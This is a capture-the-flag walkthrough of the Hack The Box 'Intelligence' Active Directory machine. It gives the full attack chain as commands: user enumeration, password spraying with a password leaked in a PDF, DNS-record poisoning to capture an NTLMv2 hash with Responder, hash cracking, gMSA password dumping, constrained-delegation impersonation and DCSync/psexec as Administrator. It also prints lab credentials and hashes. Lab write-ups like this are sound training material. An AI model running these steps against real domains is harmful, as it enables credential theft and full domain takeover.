---
description: https://app.hackthebox.com/machines/Intelligence
---

# Intelligence

### Autorecon

**Password:** PentestEverything

{% file src="../../../.gitbook/assets/Autorecon - 10.10.10.248.7z" %}

### BloodHound

{% file src="../../../.gitbook/assets/Bloodhound - 10.10.10.248.zip" %}

## Nmap

```
nmap 10.10.10.248 -p- -sS -sV                                                                                                                                    

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-16 03:37:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
59877/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% hint style="info" %}
Add "10.10.10.248 intelligence.htb" to /etc/hosts.
{% endhint %}

Starting out on port 80 we come to the root page for Intelligence.

![http://10.10.10.248/](<../../../.gitbook/assets/image (2056) (1) (1) (1) (1) (1).png>)

Running `feroxbuster` against the host revelas few results.

```bash
 feroxbuster -u http://10.10.10.248 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt 
```

![](<../../../.gitbook/assets/image (2035) (1) (1).png>)

We see that further down the main page we have an opportunity to download a PDF document. At a glance there is nothing special about the document.

![](<../../../.gitbook/assets/image (2039) (1).png>)

However, pulling metadata from the PDF document reveals potentially interesting user information.

We can achieve this withe `exiftool`.

```
exiftool 2020-01-01-upload.pdf
```

![](<../../../.gitbook/assets/image (2076) (1) (1) (1) (1).png>)

We can then put the username into a known user text file and checking if the name is valid with kerbrute.

```
kerbrute userenum users.txt -d intelligence.htb --dc 10.10.10.248
```

![](<../../../.gitbook/assets/image (2061) (1) (1) (1) (1) (1).png>)

Great, we have a valid username. However, I was unable to brute force this user account. We also know the the account does not have pre-authentication enabled...

Looking back at the original request for the PDF document we notice we are unable list the contents or browse to the `/documents` directory on port 80.

![](<../../../.gitbook/assets/image (2070) (1) (1) (1) (1) (1).png>)

The URL request for the document download has potentially fuzzable areas in the file name. We can try fuzzing for other PDF documents in the date range of the file name.

```
http://10.10.10.248/documents/2020-01-01-upload.pdf
```

Firstly, I started `OWASP ZAP` and requested the PDF document again. From here I selected the request and sent it to the fuzzer.

To ensure complete coverage I selected each individual numeral from the date and added individual payloads for numbers 0-9 using the Numberzz module.

![](<../../../.gitbook/assets/image (2038) (1).png>)

Then executed the fuzzer, in total we send 10000 requests to the target. Once completed sorting the results by size shows which requests have PDF documents available.

![](<../../../.gitbook/assets/image (2087) (1) (1) (1) (1).png>)

Highlighting all the request with a response body larger than 1,245 bytes should represent everything of interest.

Once we highlight all the request of interest we can right click to open the contextual menu and "Copy URLs to clipboard" and paste the results into a text file.

![](<../../../.gitbook/assets/image (2054) (1) (1) (1) (1).png>)

With a list of URLs we can run `xargs` with `curl` to download from each URL.

```
xargs -n 1 curl -O < "URLs.txt" 
```

![](<../../../.gitbook/assets/image (2082) (1) (1).png>)

![](<../../../.gitbook/assets/image (2081) (1) (1) (1).png>)

We can then run `exiftool` against all PDF's and extract the creator names into a known users file.

```
exiftool -r *.pdf | grep Creator | sed 's/Creator                         : //' | sort | uniq > KnownUsers.txt
```

![](<../../../.gitbook/assets/image (2047) (1) (1) (1) (1).png>)

```
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

Checking against `kerbrute` for pre-authentication we do not get any positive hits. We do at least confirm the existence of users so far.

![](<../../../.gitbook/assets/image (2042) (1) (1) (1) (1) (1).png>)

From here I tried brute forcing the username list for quite some time, utilizing various common password lists and could not get a single hit over any of the available protocols.

Digging deeper into our results I looked into parsing all the PDF documents for interesting information.

I researched the best way to parse PDF documents recursively for information and came across `pdfgrep`.

**Install**

```
sudo apt install pdfgrep
```

Using the following command and specified pattern we identify something of interest.

```
pdfgrep  pass -r .
```

![](<../../../.gitbook/assets/image (2055) (1) (1) (1) (1).png>)

Opening the file 2020-06-04-upload.pdf show us a potential password.

![](<../../../.gitbook/assets/image (2078) (1) (1) (1) (1) (1).png>)

**Password**

```
NewIntelligenceCorpUser9876
```

We can spray this password with `crackmapexec` against SMB with our user list.

```bash
crackmapexec smb '10.10.10.248' -u 'users.txt' -p 'NewIntelligenceCorpUser9876'
```

![](<../../../.gitbook/assets/image (2052) (1) (1) (1) (1).png>)

Where we the following valid credentials:

```
Tiffany.Molina:NewIntelligenceCorpUser9876
```

I was unable to utilize the user credentials to gain shell on the target system. We can however, use Bloodhound.py for external information gathering.

**Github:** [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```
sudo python2 bloodhound.py -u 'tiffany.molina' -p 'NewIntelligenceCorpUser9876' -c All -d intelligence.htb -gc dc.intelligence.htb -ns 10.10.10.248 --dns-timeout 20 --zip
```

![](<../../../.gitbook/assets/image (2064) (1) (1) (1) (1) (1) (1).png>)

Looking at the `Bloodhound` results we have found a path for performing privilege escalation. First we need to try and get access to either Ted's or Laura's AD accounts.

![](<../../../.gitbook/assets/image (2075) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Back to our _tiffany_ user we look at SMB. We see we have read access to the IT Share.

```
smbmap -u 'tiffany.molina' -p 'NewIntelligenceCorpUser9876' -H 10.10.10.248 
```

![](<../../../.gitbook/assets/image (2040).png>)

Inside the IT share we find a `PowerShell` script which can be downloaded. The contents of which has been shown below:

```powershell
﻿# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Looking at the script it looks like a list of `DNS` records is fetched from `LDAP` and any records with name like "web" are then used in an `Invoke-WebRequest` to test if alive. The parameter -- `-UseDefaultCredentials` runs the script in the context of the user. Hopefully this will be Ted going by the `Send-MailMessage` parameters.

We can probably use `Responder` to try and catch a `NTLM` hash here. First we need a way for a new DNS record to point back to us.

`dnstool.py` can be used to add a new DNS record into into the target domain. The command below adds a new DNS record starting with "web" to trigger the PowerShell script that runs every 5 minutes.

**Github:** https://github.com/dirkjanm/krbrelayx.git

```
sudo python3 dnstool.py -u intelligence.htb\\tiffany.molina -p 'NewIntelligenceCorpUser9876' -r Webfake.intelligence.htb -a add -d 10.10.14.14 10.10.10.248 
```

![](<../../../.gitbook/assets/image (2050) (1) (1) (1) (1) (1).png>)

We can confirm the DNS record has been added by using `ldapsearcher` with _tiffany's_ credentials.

```bash
ldapsearch -x -h 10.10.10.248 -D 'CN=Tiffany Molina,CN=Users,DC=intelligence,DC=htb' -w 'NewIntelligenceCorpUser9876' -b "DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | grep Web 
```

![](<../../../.gitbook/assets/image (2062) (1) (1) (1) (1) (1) (1).png>)

Then we can start `Responder` (with default responder.conf file). After around five minutes we should catch an NTLMv2 hash where the `PowerShell` script is triggered and points back to our attacking machine.

```
sudo python2 Responder.py -I tun0 -A
```

![](<../../../.gitbook/assets/image (2065) (1) (1) (1) (1) (1) (1) (1).png>)

**NTLMv2 hash**

```
Ted.Graves::intelligence:442c947175c3a3b7:137066EA5B18D803A78BEF442908364D:0101000000000000CC66ACA71E3AD80150504B3119CD58940000000002000800530034005100460001001E00570049004E002D004E004B003300480031004F0035004F004B00430056000400140053003400510046002E004C004F00430041004C0003003400570049004E002D004E004B003300480031004F0035004F004B00430056002E0053003400510046002E004C004F00430041004C000500140053003400510046002E004C004F00430041004C0008003000300000000000000000000000002000003D77F8C6CE9B70C505FB3580F608ED4749CDEC71C40CC8AB5EEBC6575A2F6FDD0A0010000000000000000000000000000000000009003A0048005400540050002F00770065006200660061006B0065002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

We can then crack password with `hashcat` against the rockyou.txt password list.

```
hashcat -m 5600 hash.hash /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (2063) (1) (1) (1) (1) (1).png>)

We now have the following credentials

```
Ted.Graves:Mr.Teddy
```

Now that we have access to Ted's account we can refer back to the `Bloodhound` attack path identified earlier on.

![](<../../../.gitbook/assets/image (2080) (1) (1) (1) (1).png>)

GMSA or Group Managed Serivce Accounts \*\*\*\* offer a more automated and secure way to manage service accounts. Stealthbits have a great blog post on what they are and how they are implimented linked below.

* [https://stealthbits.com/blog/what-are-group-managed-service-accounts-gmsa/](https://stealthbits.com/blog/what-are-group-managed-service-accounts-gmsa/)
* [https://stealthbits.com/blog/securing-gmsa-passwords/](https://stealthbits.com/blog/securing-gmsa-passwords/)

gMSADUmper is a python script that can be utilized to read the msDS-ManagedPassword \*\*\*\* attribute and decrypt with the **msDS-ManagedPasswordID** attribute.

**gMSADumper:** [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```python
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -l 10.10.10.248
```

![](<../../../.gitbook/assets/image (2077) (1) (1) (1) (1) (1).png>)

**Credentials**

```
svc_int:a5fd76c71109b0b483abe309fbc92ccb
```

From the BloodHound results earlier we see svc\_int has delegate access to the domain controller.

Now with the _svc\_int_ account hash we can then use Impacket's `getST.py` to retrieve a service ticket for the service we have delegate rights to "www" and impersonate another user "administrator".

When performing this impersonating method we also get access to any services that are accessible to the impersponated account. Impersonating the administrator account gives us the ability to access services such as LDAP (DCsync Attack) or HOST (Psexec.py).

```
getST.py intelligence.htb/svc_int -hashes :a5fd76c71109b0b483abe309fbc92ccb -spn WWW/dc.intelligence.htb -impersonate Administrator
```

![](<../../../.gitbook/assets/image (2074) (1) (1) (1) (1) (1) (1).png>)

Then run the following command to set the kerberos ticket use with Impacket.

```
export KRB5CCNAME=Administrator.ccache
```

Secretsdump.py can be used to then perform a DCsync attack and dump hashes.

```
secretsdump.py -k -no-pass dc.intelligence.htb
```

Psexec.py can also be used for direct system access as the administrator account.

```
psexec.py -k -no-pass dc.intelligence.htb
```

![](<../../../.gitbook/assets/image (2041) (1).png>)
